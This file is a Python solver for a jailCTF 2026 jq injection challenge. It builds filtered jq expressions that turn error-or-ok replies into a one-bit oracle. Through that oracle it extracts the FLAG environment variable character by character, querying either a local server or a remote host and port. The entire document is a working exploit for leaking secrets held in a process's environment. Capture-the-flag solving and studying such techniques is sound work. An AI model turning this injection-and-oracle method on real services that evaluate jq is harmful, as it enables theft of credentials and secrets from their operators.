#!/usr/bin/env python3
"""
Solver for jailCTF 2026 "just another injection challenge".

The challenge only accepts lowercase letters and '|'.  We turn jq's process
exit status into a one-bit oracle:

    <numeric feature>|<domain-filter chain>|error

If the target value is present, jq reaches `error` and server.py prints
"error".  Otherwise every value is filtered out and server.py prints "ok".

Local proof:
  python3 solve.py local --server server.py \
      --flag 'jail{flag_will_be_here_on_remote}'

Remote:
  python3 solve.py remote HOST PORT
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import string
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Callable, Iterable, Sequence

DEFAULT_CHARSET = string.ascii_lowercase + string.digits + "_"
BASE = "env|flatten|sort|last"
TOKEN_RE = re.compile(rb"(?:^|\n|expr: )(ok|error|blocked)\n")


def nested_json(value, count: int) -> str:
    for _ in range(count):
        value = json.dumps(value, ensure_ascii=False, separators=(",", ":"))
    assert isinstance(value, str)
    return value


def codepoint_sum(text: str) -> int:
    return sum(map(ord, text))


def unique_codepoint_sum(text: str) -> int:
    return sum(set(map(ord, text)))


def decimal_fingerprint(value: int, kind: str) -> int:
    text = str(int(value))
    cps = list(map(ord, text))
    if kind == "len":
        return len(text)
    if kind == "first":
        return cps[0]
    if kind == "last":
        return cps[-1]
    if kind == "min":
        return min(cps)
    if kind == "max":
        return max(cps)
    if kind == "add":
        return sum(cps)
    if kind == "uniq":
        return sum(set(cps))
    if kind == "revjsonuniq":
        encoded = json.dumps(text, ensure_ascii=False, separators=(",", ":"))
        return unique_codepoint_sum(encoded)
    raise ValueError(kind)


@dataclass(frozen=True)
class Feature:
    name: str
    suffix: str
    evaluate: Callable[[int, int | None], int]


def build_features() -> list[Feature]:
    features: list[Feature] = [
        Feature("add", "flatten|add", lambda i, c: i if c is None else i + c),
        Feature("min", "flatten|min", lambda i, c: i if c is None else min(i, c)),
        Feature("max", "flatten|max", lambda i, c: i if c is None else max(i, c)),
        Feature(
            "uniqadd",
            "flatten|unique|add",
            lambda i, c: i if c is None or i == c else i + c,
        ),
    ]

    kinds = ("len", "first", "last", "min", "max", "add", "uniq", "revjsonuniq")
    for typ in ("impl", "flat", "rec"):
        for nesting in range(1, 6):
            if typ == "impl":
                prefix = ["flatten", "implode"]
            elif typ == "flat":
                prefix = ["flatten"]
            else:
                prefix = []
            checksum_parts = prefix + ["tojson"] * nesting + ["explode", "add"]

            def checksum(i: int, c: int | None, typ: str = typ, nesting: int = nesting) -> int:
                flat = [i] if c is None else [i, c]
                if typ == "impl":
                    base: object = "".join(chr(v) for v in flat)
                elif typ == "flat":
                    base = flat
                else:
                    base = [[i]] if c is None else [[i], c]
                return codepoint_sum(nested_json(base, nesting))

            for kind in kinds:
                parts = list(checksum_parts)
                if kind == "len":
                    parts += ["tostring", "length"]
                elif kind in ("first", "last", "min", "max", "add"):
                    parts += ["tostring", "explode", kind]
                elif kind == "uniq":
                    parts += ["tostring", "explode", "unique", "add"]
                else:
                    parts += ["tostring", "tojson", "explode", "unique", "add"]

                def evaluate(
                    i: int,
                    c: int | None,
                    checksum: Callable[[int, int | None], int] = checksum,
                    kind: str = kind,
                ) -> int:
                    return decimal_fingerprint(checksum(i, c), kind)

                features.append(
                    Feature(f"{typ}j{nesting}_{kind}", "|".join(parts), evaluate)
                )
    assert len(features) == 124
    return features


FEATURES = build_features()


def predicate(ops: Sequence[str]) -> str:
    # Some entries such as "frexp|first" are deliberately multi-stage macros.
    parts: list[str] = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)


class Oracle:
    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        raise NotImplementedError

    def close(self) -> None:
        pass


class LocalServerOracle(Oracle):
    def __init__(self, server: Path, flag: str, jq: str = "jq", timeout: int = 600):
        import select

        self.server = server
        self.flag = flag
        self.jq = jq
        self.timeout = timeout
        self._select = select
        jq_path = Path(self.jq)
        path_entries: list[str] = []
        if jq_path.parent != Path("."):
            path_entries.append(str(jq_path.resolve().parent))
        path_entries += ["/usr/local/bin", "/usr/bin", "/bin"]
        env = {
            "PATH": ":".join(dict.fromkeys(path_entries)),
            "FLAG": self.flag,
            "LANG": "C",
        }
        self.proc = subprocess.Popen(
            [sys.executable, str(self.server)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            bufsize=0,
        )
        assert self.proc.stdin is not None and self.proc.stdout is not None
        self.buffer = b""
        self._consume_initial_prompt()

    def _read_some(self, deadline: float) -> bytes:
        assert self.proc.stdout is not None
        remaining = deadline - time.time()
        if remaining <= 0:
            raise TimeoutError("local oracle read timed out")
        ready, _, _ = self._select.select([self.proc.stdout], [], [], remaining)
        if not ready:
            raise TimeoutError("local oracle read timed out")
        chunk = os.read(self.proc.stdout.fileno(), 65536)
        if not chunk:
            stderr = b""
            if self.proc.stderr is not None:
                stderr = self.proc.stderr.read() or b""
            raise EOFError(
                f"local server closed unexpectedly; rc={self.proc.poll()}, "
                f"stderr={stderr[-1000:]!r}"
            )
        return chunk

    def _consume_initial_prompt(self) -> None:
        deadline = time.time() + self.timeout
        while b"expr: " not in self.buffer:
            self.buffer += self._read_some(deadline)
        self.buffer = self.buffer.split(b"expr: ", 1)[1]

    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        if not expressions:
            return []
        assert self.proc.stdin is not None
        started = time.time()
        deadline = started + self.timeout
        answers: list[str] = []
        # Small chunks avoid a pipe full-duplex deadlock while still amortizing
        # prompt/transport overhead.
        for offset in range(0, len(expressions), 32):
            group = expressions[offset : offset + 32]
            self.proc.stdin.write(("\n".join(group) + "\n").encode())
            self.proc.stdin.flush()
            group_answers: list[str] = []
            while len(group_answers) < len(group):
                matches = list(TOKEN_RE.finditer(self.buffer))
                if matches:
                    take = min(len(matches), len(group) - len(group_answers))
                    group_answers.extend(m.group(1).decode() for m in matches[:take])
                    self.buffer = self.buffer[matches[take - 1].end() :]
                    if len(group_answers) == len(group):
                        break
                    continue
                self.buffer += self._read_some(deadline)
            answers.extend(group_answers)
        if "blocked" in answers:
            bad = answers.index("blocked")
            raise RuntimeError(f"payload {bad} was blocked: {expressions[bad]}")
        print(f"    local oracle: {len(expressions)} queries in {time.time()-started:.2f}s")
        return answers

    def close(self) -> None:
        if self.proc.poll() is not None:
            return
        try:
            assert self.proc.stdin is not None
            self.proc.stdin.write(b"\n")
            self.proc.stdin.flush()
            self.proc.wait(timeout=5)
        except Exception:
            self.proc.kill()
            self.proc.wait(timeout=5)


class RemoteOracle(Oracle):
    def __init__(self, host: str, port: int, timeout: int = 360):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buffer = b""
        self._consume_initial_prompt()

    def _consume_initial_prompt(self) -> None:
        while b"expr: " not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("remote closed before the first prompt")
            self.buffer += chunk
        self.buffer = self.buffer.split(b"expr: ", 1)[1]

    def query_batch(self, expressions: Sequence[str]) -> list[str]:
        if not expressions:
            return []
        # Do not push the entire payload at once.  Some inetd/socat wrappers
        # use small full-duplex buffers and can deadlock when both peers are
        # writing.  Bounded chunks also make reconnect/debugging predictable.
        started = time.time()
        answers: list[str] = []
        chunk_size = 16
        for offset in range(0, len(expressions), chunk_size):
            group = expressions[offset : offset + chunk_size]
            self.sock.sendall(("\n".join(group) + "\n").encode())
            group_answers: list[str] = []
            while len(group_answers) < len(group):
                matches = list(TOKEN_RE.finditer(self.buffer))
                if matches:
                    take = min(len(matches), len(group) - len(group_answers))
                    group_answers.extend(m.group(1).decode() for m in matches[:take])
                    self.buffer = self.buffer[matches[take - 1].end() :]
                    if len(group_answers) == len(group):
                        break
                    continue
                chunk = self.sock.recv(65536)
                if not chunk:
                    raise EOFError(
                        f"remote closed after {len(answers)+len(group_answers)}/"
                        f"{len(expressions)} answers"
                    )
                self.buffer += chunk
            answers.extend(group_answers)
        if "blocked" in answers:
            bad = answers.index("blocked")
            raise RuntimeError(f"payload {bad} was blocked: {expressions[bad]}")
        print(f"    remote oracle: {len(expressions)} queries in {time.time()-started:.2f}s")
        return answers

    def close(self) -> None:
        try:
            self.sock.sendall(b"\n")
        except OSError:
            pass
        self.sock.close()


@dataclass(frozen=True)
class Observation:
    feature_index: int
    reverse: bool
    value: int
    nuisance: int
    present: bool


def fixed_domain(position: int, length: int, charset: str) -> list[int]:
    prefix = "jail{"
    if position < len(prefix):
        return [ord(prefix[position])]
    if position == length - 1:
        return [ord("}")]
    return list(map(ord, charset))


def recover_length(
    oracle: Oracle,
    chains: dict[int, list[str]],
    minimum: int,
    maximum: int,
) -> int:
    candidates = set(range(minimum, maximum + 1))

    def digit_values(n: int) -> list[int]:
        return list(map(ord, str(n)))

    signatures: list[tuple[str, Callable[[int], int]]] = [
        ("", lambda n: n),
        ("tostring|length", lambda n: len(str(n))),
        ("tostring|explode|first", lambda n: digit_values(n)[0]),
        ("tostring|explode|last", lambda n: digit_values(n)[-1]),
        ("tostring|explode|add", lambda n: sum(digit_values(n))),
        ("tostring|explode|unique|add", lambda n: sum(set(digit_values(n)))),
        (
            "tostring|tojson|explode|unique|add",
            lambda n: unique_codepoint_sum(json.dumps(str(n), separators=(",", ":"))),
        ),
    ]

    for suffix, fn in signatures:
        universe = sorted({fn(n) for n in candidates} & chains.keys())
        if not universe:
            continue
        expressions = []
        for value in universe:
            expr = f"{BASE}|length"
            if suffix:
                expr += f"|{suffix}"
            expr += f"|{predicate(chains[value])}|error"
            expressions.append(expr)
        answers = oracle.query_batch(expressions)
        present = {v for v, answer in zip(universe, answers) if answer == "error"}
        if len(present) > 1:
            raise RuntimeError(f"length signature produced multiple values: {present}")
        if present:
            actual = next(iter(present))
            candidates = {n for n in candidates if fn(n) == actual}
        else:
            candidates = {n for n in candidates if fn(n) not in chains}
        print(f"[+] length signature {suffix or 'identity'} -> {sorted(candidates)}")
        if len(candidates) == 1:
            return next(iter(candidates))
        if not candidates:
            raise RuntimeError("length constraints became inconsistent")
    raise RuntimeError(f"could not determine a unique length: {sorted(candidates)}")


def make_feature_queries(
    length: int,
    charset: str,
    feature_indices: Iterable[int],
    chains: dict[int, list[str]],
    domains: dict[int, list[int]] | None = None,
) -> tuple[list[str], list[tuple[int, bool, int, int]]]:
    if domains is None:
        domains = {i: fixed_domain(i, length, charset) for i in range(length)}
    expressions: list[str] = []
    metadata: list[tuple[int, bool, int, int]] = []
    for fi in feature_indices:
        feature = FEATURES[fi]
        for reverse in (False, True):
            nuisance = feature.evaluate(length - 1, None)
            values = {nuisance}
            for position, chars in domains.items():
                index = length - 1 - position if reverse else position
                values.update(feature.evaluate(index, char) for char in chars)
            for value in sorted(values & chains.keys()):
                base = BASE
                if reverse:
                    base += "|explode|reverse|implode"
                expr = (
                    f"{base}|explode|tostream|{feature.suffix}|"
                    f"{predicate(chains[value])}|error"
                )
                expressions.append(expr)
                metadata.append((fi, reverse, value, nuisance))
    return expressions, metadata


def apply_negative_observations(
    length: int,
    charset: str,
    observations: Sequence[Observation],
) -> dict[int, list[int]]:
    domains = {i: fixed_domain(i, length, charset) for i in range(length)}
    for obs in observations:
        if obs.present:
            continue
        feature = FEATURES[obs.feature_index]
        for position in range(length):
            index = length - 1 - position if obs.reverse else position
            domains[position] = [
                char
                for char in domains[position]
                if feature.evaluate(index, char) != obs.value
            ]
            if not domains[position]:
                raise RuntimeError(
                    f"empty domain at position {position}; predicate table/server math mismatch"
                )
    return domains


def positive_constraints(
    length: int,
    observations: Sequence[Observation],
    domains: dict[int, list[int]],
) -> list[frozenset[tuple[int, int]]]:
    constraints: set[frozenset[tuple[int, int]]] = set()
    for obs in observations:
        if not obs.present or obs.value == obs.nuisance:
            continue
        feature = FEATURES[obs.feature_index]
        options = set()
        for position, chars in domains.items():
            index = length - 1 - position if obs.reverse else position
            for char in chars:
                if feature.evaluate(index, char) == obs.value:
                    options.add((position, char))
        if not options:
            raise RuntimeError("positive observation has no remaining candidate")
        constraints.add(frozenset(options))
    return sorted(constraints, key=lambda item: (len(item), sorted(item)))


def solve_constraints(
    length: int,
    domains: dict[int, list[int]],
    constraints: Sequence[frozenset[tuple[int, int]]],
    limit: int = 2,
) -> list[str]:
    solutions: list[str] = []

    def feasible(assign: dict[int, int], current: dict[int, list[int]]) -> bool:
        selected = {(i, c) for i, c in assign.items()}
        for constraint in constraints:
            if selected & constraint:
                continue
            if not any(
                i not in assign and c in current[i]
                for i, c in constraint
            ):
                return False
        return True

    def recurse(assign: dict[int, int], current: dict[int, list[int]]) -> None:
        if len(solutions) >= limit:
            return
        # Unit propagation: if every remaining witness for a constraint belongs
        # to one position, that position must choose one of those characters.
        while True:
            changed = False
            selected = {(i, c) for i, c in assign.items()}
            for constraint in constraints:
                if selected & constraint:
                    continue
                possible = [
                    (i, c)
                    for i, c in constraint
                    if i not in assign and c in current[i]
                ]
                if not possible:
                    return
                positions = {i for i, _ in possible}
                if len(positions) == 1:
                    position = next(iter(positions))
                    allowed = {c for _, c in possible}
                    narrowed = [c for c in current[position] if c in allowed]
                    if not narrowed:
                        return
                    if len(narrowed) < len(current[position]):
                        current = dict(current)
                        current[position] = narrowed
                        changed = True
                    if len(narrowed) == 1 and position not in assign:
                        assign = dict(assign)
                        assign[position] = narrowed[0]
                        selected.add((position, narrowed[0]))
                        changed = True
            for position, chars in current.items():
                if position not in assign and len(chars) == 1:
                    assign = dict(assign)
                    assign[position] = chars[0]
                    changed = True
            if not changed:
                break
        if not feasible(assign, current):
            return
        if len(assign) == length:
            solutions.append("".join(chr(assign[i]) for i in range(length)))
            return
        position = min(
            (i for i in range(length) if i not in assign),
            key=lambda i: len(current[i]),
        )
        for char in current[position]:
            trial = dict(assign)
            trial[position] = char
            if feasible(trial, current):
                recurse(trial, current)

    recurse({}, domains)
    return solutions


def value_set_for_flag(flag: str, feature_index: int, reverse: bool) -> set[int]:
    feature = FEATURES[feature_index]
    length = len(flag)
    values = {feature.evaluate(length - 1, None)}
    for position, char in enumerate(flag):
        index = length - 1 - position if reverse else position
        values.add(feature.evaluate(index, ord(char)))
    return values


def single_feature_expression(
    feature_index: int,
    reverse: bool,
    value: int,
    chains: dict[int, list[str]],
) -> str:
    feature = FEATURES[feature_index]
    base = BASE
    if reverse:
        base += "|explode|reverse|implode"
    return (
        f"{base}|explode|tostream|{feature.suffix}|"
        f"{predicate(chains[value])}|error"
    )


def choose_discriminator(
    first: str,
    second: str,
    chains: dict[int, list[str]],
    queried: set[tuple[int, bool, int]],
) -> tuple[int, bool, int, int] | None:
    choices: list[tuple[int, int, int, bool, int, int]] = []
    length = len(first)
    for fi in range(84, len(FEATURES)):
        feature = FEATURES[fi]
        nuisance = feature.evaluate(length - 1, None)
        for reverse in (False, True):
            left = value_set_for_flag(first, fi, reverse)
            right = value_set_for_flag(second, fi, reverse)
            for value in (left ^ right) & chains.keys():
                if (fi, reverse, value) in queried:
                    continue
                # Prefer short predicates and short jq feature pipelines.
                cost = len(chains[value]) * 10 + feature.suffix.count("|")
                choices.append((cost, value, fi, reverse, nuisance, len(chains[value])))
    if not choices:
        return None
    _, value, fi, reverse, nuisance, _ = min(choices)
    return fi, reverse, value, nuisance


def run_attack(oracle: Oracle, chains_path: Path, charset: str, minimum: int, maximum: int) -> str:
    raw = json.loads(chains_path.read_text())
    chains = {int(value): ops for value, ops in raw.items()}
    print(f"[+] loaded {len(chains)} locally validated singleton predicates")

    print("[*] recovering flag length")
    length = recover_length(oracle, chains, minimum, maximum)
    print(f"[+] flag length = {length}")

    observations: list[Observation] = []
    queried: set[tuple[int, bool, int]] = set()

    # Broad phase: these 84 features reduce a normal jail{...} flag to a tiny
    # CSP while staying comfortably inside the 240-second service budget.
    expressions, metadata = make_feature_queries(
        length, charset, range(0, 84), chains
    )
    print(f"[*] broad phase: 84 features, {len(expressions)} oracle queries")
    answers = oracle.query_batch(expressions)
    for (fi, reverse, value, nuisance), answer in zip(metadata, answers):
        observations.append(
            Observation(fi, reverse, value, nuisance, answer == "error")
        )
        queried.add((fi, reverse, value))

    # Usually the broad phase is already unique.  If not, do not send another
    # large batch: compare two surviving flags and ask one targeted question
    # whose output sets differ.  This makes the fallback cheap and avoids
    # fragile high-volume second-stage traffic.
    for adaptive_round in range(1, 101):
        domains = apply_negative_observations(length, charset, observations)
        constraints = positive_constraints(length, observations, domains)
        domain_size = sum(map(len, domains.values()))
        solutions = solve_constraints(length, domains, constraints)
        print(
            f"[+] candidate assignments: {domain_size}; "
            f"positive constraints: {len(constraints)}"
        )
        if len(solutions) == 1:
            print(f"[+] unique flag: {solutions[0]}")
            return solutions[0]
        if not solutions:
            raise RuntimeError("constraint system has no solution")

        print(f"[!] ambiguity {adaptive_round}: {solutions[0]} / {solutions[1]}")
        chosen = choose_discriminator(solutions[0], solutions[1], chains, queried)
        if chosen is None:
            raise RuntimeError(
                "remaining candidates collide under every available feature"
            )
        fi, reverse, value, nuisance = chosen
        expr = single_feature_expression(fi, reverse, value, chains)
        answer = oracle.query_batch([expr])[0]
        observations.append(
            Observation(fi, reverse, value, nuisance, answer == "error")
        )
        queried.add((fi, reverse, value))
        print(
            f"[*] discriminator: {FEATURES[fi].name}, "
            f"reverse={reverse}, value={value}, present={answer == 'error'}"
        )

    raise RuntimeError("adaptive discriminator limit reached")


def _jq_version(jq: str) -> str:
    try:
        proc = subprocess.run([jq, "--version"], capture_output=True, text=True, timeout=5)
        return (proc.stdout or proc.stderr).strip()
    except Exception as exc:
        return f"unavailable: {exc}"


def main() -> int:
    here = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--chains", type=Path, default=here / "singletons.json",
        help="validated singleton predicate table",
    )
    parser.add_argument("--charset", default=DEFAULT_CHARSET)
    parser.add_argument("--min-length", type=int, default=6)
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument(
        "--force-version", action="store_true",
        help="run even if local jq is not jq-1.8.2; useful only for debugging",
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local")
    local.add_argument("--server", type=Path, default=Path("server.py"))
    local.add_argument("--flag", default="jail{flag_will_be_here_on_remote}")
    local.add_argument("--jq", default="jq")
    local.add_argument("--timeout", type=int, default=600)

    remote = sub.add_parser("remote")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    remote.add_argument("--timeout", type=int, default=360)

    args = parser.parse_args()
    if args.mode == "local":
        version = _jq_version(args.jq)
        print(f"[+] local jq version: {version}")
        if version != "jq-1.8.2" and not args.force_version:
            print("[-] This singleton table is version-sensitive and is for jq-1.8.2.", file=sys.stderr)
            print("[-] Install/use the jq-1.8.2 binary, or pass --force-version only to reproduce the mismatch.", file=sys.stderr)
            return 2
        oracle: Oracle = LocalServerOracle(args.server, args.flag, args.jq, args.timeout)
    else:
        oracle = RemoteOracle(args.host, args.port, args.timeout)
    try:
        try:
            recovered = run_attack(
                oracle, args.chains, args.charset, args.min_length, args.max_length
            )
        except RuntimeError as exc:
            if "predicate table/server math mismatch" in str(exc):
                print("[-] The oracle behavior does not match the singleton table.", file=sys.stderr)
                print("[-] Most likely causes: wrong jq version, wrong remote port, or a non-matching deployment.", file=sys.stderr)
            raise
    finally:
        oracle.close()
    if args.mode == "local" and recovered != args.flag:
        print(f"[-] local verification failed: expected {args.flag!r}", file=sys.stderr)
        return 1
    print("[+] verification successful")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
